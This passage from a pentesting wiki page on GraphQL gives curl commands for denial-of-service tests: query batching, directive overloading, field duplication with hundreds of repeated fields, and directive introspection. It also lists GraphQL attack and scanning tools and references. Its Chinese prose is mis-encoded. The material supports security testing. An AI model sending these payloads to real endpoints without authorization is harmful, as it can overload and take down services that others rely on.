<p>{% code overflow="wrap" %}</p>
<pre><code class="language-graphql"># Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '[{"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}]' \
'https://example.com/graphql'
</code></pre>
<p>{% endcode %}</p>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ10ä¸ªä¸åŒçš„æŸ¥è¯¢è¢«æ‰¹é‡å¤„ç†æˆä¸€ä¸ªè¯·æ±‚ï¼Œè¿«ä½¿æœåŠ¡å™¨åŒæ—¶æ‰§è¡Œæ‰€æœ‰æŸ¥è¯¢ã€‚å¦‚æœåˆ©ç”¨æ›´å¤§çš„æ‰¹é‡å¤§å°æˆ–è®¡ç®—å¼€é”€å¤§çš„æŸ¥è¯¢ï¼Œè¿™å¯èƒ½ä¼šä½¿æœåŠ¡å™¨è¿‡è½½ã€‚</p>
<h3 id="æŒ‡ä»¤è¿‡è½½æ¼æ´"><a class="header" href="#æŒ‡ä»¤è¿‡è½½æ¼æ´"><strong>æŒ‡ä»¤è¿‡è½½æ¼æ´</strong></a></h3>
<p><strong>æŒ‡ä»¤è¿‡è½½</strong>å‘ç”Ÿåœ¨GraphQLæœåŠ¡å™¨å…è®¸å¸¦æœ‰è¿‡å¤šé‡å¤æŒ‡ä»¤çš„æŸ¥è¯¢æ—¶ã€‚è¿™å¯èƒ½ä¼šä½¿æœåŠ¡å™¨çš„è§£æå™¨å’Œæ‰§è¡Œå™¨ä¸å ªé‡è´Ÿï¼Œç‰¹åˆ«æ˜¯å½“æœåŠ¡å™¨åå¤å¤„ç†ç›¸åŒçš„æŒ‡ä»¤é€»è¾‘æ—¶ã€‚å¦‚æœæ²¡æœ‰é€‚å½“çš„éªŒè¯æˆ–é™åˆ¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ä¸€ä¸ªåŒ…å«å¤§é‡é‡å¤æŒ‡ä»¤çš„æŸ¥è¯¢æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œä»è€Œè§¦å‘é«˜è®¡ç®—æˆ–å†…å­˜ä½¿ç”¨ï¼Œå¯¼è‡´<strong>æœåŠ¡æ‹’ç»ï¼ˆDoSï¼‰</strong>ã€‚</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash"># Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @aa@aa@aa@aa@aa@aa@aa@aa@aa@aa }", "operationName": "cop"}' \
'https://example.com/graphql'
</code></pre>
<p>{% endcode %}</p>
<p>è¯·æ³¨æ„ï¼Œåœ¨å‰é¢çš„ç¤ºä¾‹ä¸­ï¼Œ<code>@aa</code> æ˜¯ä¸€ä¸ª <strong>å¯èƒ½æœªå£°æ˜</strong> çš„è‡ªå®šä¹‰æŒ‡ä»¤ã€‚é€šå¸¸å­˜åœ¨çš„ä¸€ä¸ªå¸¸è§æŒ‡ä»¤æ˜¯ <strong><code>@include</code></strong>ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @include(if: true) @include(if: true) @include(if: true) @include(if: true) @include(if: true) }", "operationName": "cop"}' \
'https://example.com/graphql'
</code></pre>
<p>{% endcode %}</p>
<p>æ‚¨è¿˜å¯ä»¥å‘é€ä¸€ä¸ª introspection æŸ¥è¯¢ä»¥å‘ç°æ‰€æœ‰å£°æ˜çš„æŒ‡ä»¤ï¼š</p>
<pre><code class="language-bash">curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "{ __schema { directives { name locations args { name type { name kind ofType { name } } } } } }"}' \
'https://example.com/graphql'
</code></pre>
<p>ç„¶å<strong>ä½¿ç”¨ä¸€äº›è‡ªå®šä¹‰çš„</strong>ã€‚</p>
<h3 id="å­—æ®µé‡å¤æ¼æ´"><a class="header" href="#å­—æ®µé‡å¤æ¼æ´"><strong>å­—æ®µé‡å¤æ¼æ´</strong></a></h3>
<p><strong>å­—æ®µé‡å¤</strong>æ˜¯ä¸€ç§æ¼æ´ï¼Œå…¶ä¸­GraphQLæœåŠ¡å™¨å…è®¸æŸ¥è¯¢ä¸­é‡å¤è¿‡å¤šçš„ç›¸åŒå­—æ®µã€‚è¿™è¿«ä½¿æœåŠ¡å™¨ä¸ºæ¯ä¸ªå®ä¾‹å†—ä½™åœ°è§£æè¯¥å­—æ®µï¼Œæ¶ˆè€—å¤§é‡èµ„æºï¼ˆCPUã€å†…å­˜å’Œæ•°æ®åº“è°ƒç”¨ï¼‰ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ åŒ…å«æ•°ç™¾æˆ–æ•°åƒä¸ªé‡å¤å­—æ®µçš„æŸ¥è¯¢ï¼Œå¯¼è‡´é«˜è´Ÿè½½ï¼Œå¹¶å¯èƒ½å¯¼è‡´<strong>æœåŠ¡æ‹’ç»ï¼ˆDoSï¼‰</strong>ã€‚</p>
<pre><code class="language-bash"># Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" -H "Content-Type: application/json" \
-d '{"query": "query cop { __typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n} ", "operationName": "cop"}' \
'https://example.com/graphql'
</code></pre>
<h2 id="å·¥å…·"><a class="header" href="#å·¥å…·">å·¥å…·</a></h2>
<h3 id="æ¼æ´æ‰«æå™¨"><a class="header" href="#æ¼æ´æ‰«æå™¨">æ¼æ´æ‰«æå™¨</a></h3>
<ul>
<li><a href="https://github.com/dolevf/graphql-cop">https://github.com/dolevf/graphql-cop</a>: æµ‹è¯•graphqlç«¯ç‚¹çš„å¸¸è§é”™è¯¯é…ç½®</li>
<li><a href="https://github.com/assetnote/batchql">https://github.com/assetnote/batchql</a>: ä¸“æ³¨äºæ‰§è¡Œæ‰¹é‡GraphQLæŸ¥è¯¢å’Œå˜æ›´çš„GraphQLå®‰å…¨å®¡è®¡è„šæœ¬ã€‚</li>
<li><a href="https://github.com/dolevf/graphw00f">https://github.com/dolevf/graphw00f</a>: æŒ‡çº¹è¯†åˆ«æ­£åœ¨ä½¿ç”¨çš„graphql</li>
<li><a href="https://github.com/gsmith257-cyber/GraphCrawler">https://github.com/gsmith257-cyber/GraphCrawler</a>: å·¥å…·åŒ…ï¼Œå¯ç”¨äºæŠ“å–æ¨¡å¼å¹¶æœç´¢æ•æ„Ÿæ•°æ®ï¼Œæµ‹è¯•æˆæƒï¼Œæš´åŠ›ç ´è§£æ¨¡å¼ï¼Œå¹¶æ‰¾åˆ°åˆ°ç»™å®šç±»å‹çš„è·¯å¾„ã€‚</li>
<li><a href="https://blog.doyensec.com/2020/03/26/graphql-scanner.html">https://blog.doyensec.com/2020/03/26/graphql-scanner.html</a>: å¯ä½œä¸ºç‹¬ç«‹å·¥å…·æˆ–<a href="https://github.com/doyensec/inql">Burpæ‰©å±•</a>ä½¿ç”¨ã€‚</li>
<li><a href="https://github.com/swisskyrepo/GraphQLmap">https://github.com/swisskyrepo/GraphQLmap</a>: ä¹Ÿå¯ä»¥ä½œä¸ºCLIå®¢æˆ·ç«¯ä½¿ç”¨ä»¥è‡ªåŠ¨åŒ–æ”»å‡»</li>
<li><a href="https://gitlab.com/dee-see/graphql-path-enum">https://gitlab.com/dee-see/graphql-path-enum</a>: åˆ—å‡ºåœ¨GraphQLæ¨¡å¼ä¸­<strong>åˆ°è¾¾ç»™å®šç±»å‹çš„ä¸åŒæ–¹å¼</strong>çš„å·¥å…·ã€‚</li>
<li><a href="https://github.com/doyensec/GQLSpection">https://github.com/doyensec/GQLSpection</a>: InQLçš„ç‹¬ç«‹å’ŒCLIæ¨¡å¼çš„ç»§ä»»è€…</li>
<li><a href="https://github.com/doyensec/inql">https://github.com/doyensec/inql</a>: ç”¨äºé«˜çº§GraphQLæµ‹è¯•çš„Burpæ‰©å±•ã€‚_<strong>æ‰«æå™¨</strong><em>æ˜¯InQL v5.0çš„æ ¸å¿ƒï¼Œæ‚¨å¯ä»¥åˆ†æGraphQLç«¯ç‚¹æˆ–æœ¬åœ°è‡ªçœæ¨¡å¼æ–‡ä»¶ã€‚å®ƒè‡ªåŠ¨ç”Ÿæˆæ‰€æœ‰å¯èƒ½çš„æŸ¥è¯¢å’Œå˜æ›´ï¼Œå¹¶å°†å…¶ç»„ç»‡æˆç»“æ„åŒ–è§†å›¾ä»¥ä¾›åˆ†æã€‚</em><strong>æ”»å‡»è€…</strong>_ç»„ä»¶å…è®¸æ‚¨è¿è¡Œæ‰¹é‡GraphQLæ”»å‡»ï¼Œè¿™å¯¹äºè§„é¿å®ç°ä¸è‰¯çš„é€Ÿç‡é™åˆ¶éå¸¸æœ‰ç”¨ã€‚</li>
<li><a href="https://github.com/nikitastupin/clairvoyance">https://github.com/nikitastupin/clairvoyance</a>: å°è¯•é€šè¿‡ä½¿ç”¨ä¸€äº›Graphqlæ•°æ®åº“çš„å¸®åŠ©ï¼Œå³ä½¿åœ¨ç¦ç”¨è‡ªçœçš„æƒ…å†µä¸‹ä¹Ÿè·å–æ¨¡å¼ï¼Œè¿™äº›æ•°æ®åº“å°†å»ºè®®å˜æ›´å’Œå‚æ•°çš„åç§°ã€‚</li>
</ul>
<h3 id="å®¢æˆ·ç«¯"><a class="header" href="#å®¢æˆ·ç«¯">å®¢æˆ·ç«¯</a></h3>
<ul>
<li><a href="https://github.com/graphql/graphiql">https://github.com/graphql/graphiql</a>: GUIå®¢æˆ·ç«¯</li>
<li><a href="https://altair.sirmuel.design/">https://altair.sirmuel.design/</a>: GUIå®¢æˆ·ç«¯</li>
</ul>
<h3 id="è‡ªåŠ¨æµ‹è¯•"><a class="header" href="#è‡ªåŠ¨æµ‹è¯•">è‡ªåŠ¨æµ‹è¯•</a></h3>
<p>{% embed url="https://graphql-dashboard.herokuapp.com/" %}</p>
<ul>
<li>è§£é‡ŠAutoGraphQLçš„è§†é¢‘: <a href="https://www.youtube.com/watch?v=JJmufWfVvyU">https://www.youtube.com/watch?v=JJmufWfVvyU</a></li>
</ul>
<h2 id="å‚è€ƒ"><a class="header" href="#å‚è€ƒ">å‚è€ƒ</a></h2>
<ul>
<li><a href="https://jondow.eu/practical-graphql-attack-vectors/"><strong>https://jondow.eu/practical-graphql-attack-vectors/</strong></a></li>
<li><a href="https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696"><strong>https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696</strong></a></li>
<li><a href="https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4"><strong>https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4</strong></a></li>
<li><a href="http://ghostlulz.com/api-hacking-graphql/"><strong>http://ghostlulz.com/api-hacking-graphql/</strong></a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md"><strong>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md</strong></a></li>
<li><a href="https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696"><strong>https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696</strong></a></li>
<li><a href="https://portswigger.net/web-security/graphql"><strong>https://portswigger.net/web-security/graphql</strong></a></li>
</ul>
<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
<p>æ·±åŒ–æ‚¨åœ¨<strong>ç§»åŠ¨å®‰å…¨</strong>æ–¹é¢çš„ä¸“ä¸šçŸ¥è¯†ï¼Œå‚åŠ 8kSecå­¦é™¢ã€‚é€šè¿‡æˆ‘ä»¬çš„è‡ªå­¦è¯¾ç¨‹æŒæ¡iOSå’ŒAndroidå®‰å…¨å¹¶è·å¾—è®¤è¯ï¼š</p>
<p>{% embed url="https://academy.8ksec.io/" %}</p>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æ”»å‡»ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶(ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æ”»å‡»ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶(GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒHackTricks</summary>
<ul>
<li>æŸ¥çœ‹<a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discordå°ç»„</strong></a>æˆ–<a href="https://t.me/peass"><strong>ç”µæŠ¥å°ç»„</strong></a>æˆ–<strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>å’Œ<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> githubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../network-services-pentesting/pentesting-web/grafana.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../network-services-pentesting/pentesting-web/h2-java-sql-database.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../network-services-pentesting/pentesting-web/grafana.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../network-services-pentesting/pentesting-web/h2-java-sql-database.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
